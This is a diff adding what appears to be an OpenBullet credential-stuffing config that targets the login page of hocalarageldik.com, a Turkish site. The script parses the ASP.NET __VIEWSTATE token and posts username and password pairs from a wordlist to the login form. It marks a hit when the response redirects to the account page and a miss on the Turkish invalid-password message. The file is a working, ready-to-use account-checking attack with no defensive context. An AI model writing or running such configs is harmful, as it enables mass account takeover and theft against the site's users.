@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Hocalarageldik",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-16T01:07:11.6247277+03:00",
+  "AdditionalInfo": "",
+  "Author": "saas",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://hocalarageldik.com/giris" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"" "\"" -> VAR "VIEWSTATE" 
+
+REQUEST POST "https://hocalarageldik.com/giris" AutoRedirect=FALSE EncodeContent=TRUE 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=<VIEWSTATE>&txtemail=<USER>&txtsifre=<PASS>&btngirisyap=Giriş+Yap" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Cookie: ASP.NET_SessionId=<COOKIES(ASP.NET_SessionId)>" 
+  HEADER "Host: hocalarageldik.com" 
+  HEADER "Origin: https://hocalarageldik.com" 
+  HEADER "Referer: https://hocalarageldik.com/giris" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Kullanıcı adı veya şifre geçersiz.." 
+  KEYCHAIN Success OR 
+    KEY "Object moved to <a href=\"/hesabim\">here</a>" 
+
